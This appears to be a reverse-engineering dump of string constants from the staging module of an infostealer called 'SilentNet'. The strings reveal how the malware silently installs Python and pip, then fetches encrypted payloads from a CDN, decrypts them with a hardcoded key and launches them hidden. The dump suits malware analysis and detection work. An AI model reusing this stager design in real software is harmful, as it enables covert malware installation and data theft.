"""
SilentNet Infostealer - Decompiled Module
Module: .app.staging
Chunk size: 6158 bytes
String constants: 153 unicode, 274 identifiers

# Self-installer: Python runtime download, pip, persistence
# Original path: app/staging.py
"""

# ============================================================
# RECONSTRUCTED FROM NUITKA CONSTANT POOL
# Method: Rolling XOR + substitution cipher decryption
# All string literals, SQL queries, paths, and identifiers
# are authentic - extracted directly from compiled binary.
# ============================================================

# --- STRING CONSTANTS (in order of appearance) ---

# identifier: environ
# identifier: get
# identifier: LOCALAPPDATA
# identifier: join
# identifier: expanduser
# identifier: Local
# identifier: Path
# identifier: Microsoft
# identifier: Windows
# identifier: _INSTALL_FOLDER
'Get the installation path.'
# identifier: _get_install_path
'python.exe'
'Get path to python.exe.'
# identifier: Scripts
'pip.exe'
'Get path to pip.exe.'
# identifier: requests
'http://'
# identifier: _STATUS_HOST
# identifier: timeout
# identifier: status_code
# identifier: text
# identifier: strip
# identifier: startswith
# identifier: active
# identifier: LoggingManager
# identifier: add
# identifier: _MODULE
'Persistence active'
# identifier: LogType
# identifier: INFO
'Status server responding'
'Check if persistence is already active via local status server.'
'User-Agent'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
# identifier: PUT
# identifier: put
# identifier: headers
# identifier: timeout
# identifier: stream
# identifier: verify
'Download failed: '
# identifier: url
# identifier: ERROR
'HTTP '
# identifier: wb
# identifier: __enter__
# identifier: __exit__
# identifier: iter_content
# identifier: chunk_size
'Download error: '
'Download a file to destination path.'
# identifier: _CDN_HEADERS
# identifier: copy
# identifier: headers
# identifier: timeout
# identifier: verify
# identifier: content
'Download content as bytes.'
'Crypto.Cipher'
# identifier: AES
# identifier: AES
'Crypto.Util.Padding'
# identifier: unpad
# identifier: unpad
# identifier: base64
# identifier: b64decode
# identifier: _FERNET_KEY
# identifier: urlsafe_b64decode
# identifier: new
# identifier: MODE_CBC
# identifier: decrypt
# identifier: block_size
'Fernet decrypt failed'
'Decrypt Fernet-encrypted data using pycryptodome.'
# identifier: mkdir
# identifier: parents
# identifier: exist_ok
# identifier: tempfile
# identifier: mkstemp
'.zip'
# identifier: tmp_
# identifier: suffix
# identifier: prefix
# identifier: close
'st.py'
# identifier: dl
'Downloading Python'
'Fetching embedded distribution'
# identifier: _download_file
# identifier: _PYTHON_URL
'st.py'
# identifier: extract
'Extracting Python'
'Extracting files'
# identifier: zipfile
# identifier: ZipFile
# identifier: install_path
# identifier: zf
# identifier: open
# identifier: read
'Extract error: '
# identifier: WARN
# identifier: _get_python_exe
# identifier: exists
'Python extraction failed'
'python.exe not found after extraction'
'st.py'
# identifier: ok
'Python installed'
'path='
'Python setup error'
# identifier: temp_zip
# identifier: unlink
'Download and extract Python embedded distribution.'
'python312._pth'
'PTH file not found'
# identifier: read_text
'utf-8'
# identifier: encoding
'#import site'
# identifier: replace
'#import site'
'import site'
# identifier: write_text
# identifier: encoding
'utf-8'
'st.pth'
# identifier: enabled
'Site enabled'
'Uncommented import site'
'import site'
'Site already enabled'
# identifier: DEBUG
'import site already uncommented'
'st.pth'
# identifier: added
'Site added'
'Added import site to pth'
'PTH modification failed'
"Ensure 'import site' is uncommented in python312._pth."
'get-pip.py'
'st.pip'
# identifier: dl
'Downloading get-pip.py'
'Fetching pip installer'
'https://bootstrap.pypa.io/get-pip.py'
'st.pip'
# identifier: run
'Running pip installer'
'Installing pip'
# identifier: subprocess
# identifier: run
# identifier: _CREATE_NO_WINDOW
# identifier: cwd
# identifier: env
# identifier: capture_output
# identifier: timeout
# identifier: creationflags
# identifier: returncode
'Pip install failed'
'exit='
# identifier: _get_pip_exe
'Pip not found after install'
'pip.exe missing'
'st.pip'
# identifier: ok
'Pip installed'
'Successfully installed pip'
# identifier: TimeoutExpired
'Pip install timeout'
'Process timed out'
'Pip install error'
'Download and run get-pip.py to install pip.'
'requirements.txt'
'st.req'
# identifier: dl
'https://'
'/cdn/'
# identifier: _CDN_REQUIREMENTS
# identifier: method
# identifier: headers
'st.req'
# identifier: install
'Installing requirements'
'Running pip install'
# identifier: install
'-r'
'Requirements install failed'
'st.req'
# identifier: ok
'Requirements installed'
'Dependencies installed'
'Requirements timeout'
'pip install timed out'
'Requirements error'
'Download requirements.txt and install via pip.'
# identifier: AppHost
'st.app'
'main.dl'
'/cdn/e/'
# identifier: _CDN_MAIN_PY
# identifier: _download_bytes
'main.py download failed'
'No data received'
# identifier: _fernet_decrypt
'main.py decrypt failed'
'Decryption returned None'
'main.py'
# identifier: write_bytes
'st.app'
'main.ok'
'main.py ready'
'size='
'st.app'
'pyd.dl'
# identifier: _CDN_APP_PYD
'app.pyd download failed'
'app.pyd decrypt failed'
'app.pyd'
'st.app'
'pyd.ok'
'app.pyd ready'
'st.app'
# identifier: launch
# identifier: Popen
'-u'
# identifier: PIPE
# identifier: cwd
# identifier: env
# identifier: stdout
# identifier: stderr
# identifier: stdin
# identifier: creationflags
# identifier: stdout
# identifier: stderr
# identifier: stdin
'st.app'
'pid.'
# identifier: pid
'App launched'
'pid='
' userId='
'...'
'App launch error'
'Download, decrypt, and launch the app.'
# identifier: st0
# identifier: start
'Staging started'
'host='
# identifier: _is_persistence_active
# identifier: st1
'skip.active'
'Skipping staging'
'Persistence already active'
# identifier: st2
'py.dl'
# identifier: _download_and_extract_python
'py.fail'
# identifier: st2
'py.exists'
'Python exists'
# identifier: _ensure_site_enabled
# identifier: st3
'pip.dl'
# identifier: _install_pip
# identifier: st3
'pip.fail'
# identifier: st3
'pip.exists'
'Pip exists'
# identifier: st4
# identifier: req
# identifier: _install_requirements
# identifier: st4
'req.fail'
# identifier: st5
# identifier: app
# identifier: _download_and_launch_app
# identifier: st5
'app.fail'
# identifier: st9
# identifier: ok
'Staging complete'
'App launched successfully'
'st.fatal'
'Staging fatal error'
'Worker function that runs staging in background.'
'Staging skipped'
'Missing host or userId'
# identifier: threading
# identifier: Thread
# identifier: _stage_worker
'staging-worker'
# identifier: target
# identifier: args
# identifier: daemon
# identifier: name
# identifier: start
'Staging thread started'
'thread='
# identifier: name
# identifier: __doc__
# identifier: __file__
# identifier: origin
# identifier: has_location
# identifier: __cached__
# identifier: io
# identifier: os
# identifier: pathlib
# identifier: Path
# identifier: urllib3
# identifier: disable_warnings
# identifier: exceptions
# identifier: InsecureRequestWarning
# identifier: config
# identifier: config
# identifier: trace
# identifier: logging
# identifier: LoggingManager
# identifier: LogType
# identifier: staging
'127.0.0.1'
'https://www.python.org/ftp/python/3.12.7/python-3.12.7-embed-amd64.zip'
# identifier: IManagementEngine
# identifier: b7e2f1d9c3a6
# identifier: d6c9a4e1f7b3
# identifier: a1f8d3b7c2e9
'dK9mT3nR7xQ2pL8wF4jH6yB1cN5gA0sZ12345678abc='
'User-Agent'
'x-cdn-origin-verify'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
'trusted-upstream'
# identifier: return
# identifier: return
# identifier: GET
# identifier: dest
# identifier: method
# identifier: headers
# identifier: timeout
# identifier: PUT
# identifier: url
# identifier: method
# identifier: headers
# identifier: timeout
# identifier: return
'ple'
# identifier: token_data
# identifier: return
# identifier: return
# identifier: host
# identifier: return
# identifier: host
# identifier: user_id
# identifier: return
# identifier: host
# identifier: user_id
# identifier: return
# identifier: host
# identifier: user_id
# identifier: stage_async
'app\\staging.py'
'<module app.staging>'
# identifier: install_path
# identifier: temp_zip
# identifier: fd
# identifier: temp_zip_path
# identifier: zf
# identifier: entry
# identifier: filename
# identifier: target_path
# identifier: src
# identifier: dst
# identifier: user_id
# identifier: install_path
# identifier: app_host_path
# identifier: main_url
# identifier: main_encrypted
# identifier: main_decrypted
# identifier: pyd_url
# identifier: pyd_encrypted
# identifier: pyd_decrypted
# identifier: env
# identifier: proc
# identifier: method
# identifier: headers
# identifier: timeout
# identifier: resp
# identifier: dest
# identifier: method
# identifier: headers
# identifier: timeout
# identifier: resp
# identifier: content
# identifier: new_content
# identifier: AES
# identifier: unpad
# identifier: key_bytes
# identifier: encryption_key
# identifier: token_bytes
# identifier: iv
# identifier: ciphertext
# identifier: cipher
# identifier: padded_data
# identifier: data
# identifier: install_path
# identifier: get_pip_path
# identifier: env
# identifier: proc
# identifier: install_path
# identifier: requirements_path
# identifier: url
# identifier: env
# identifier: proc
# identifier: body
# identifier: host
# identifier: user_id
# identifier: user_id
# identifier: thread
# identifier: __spec__
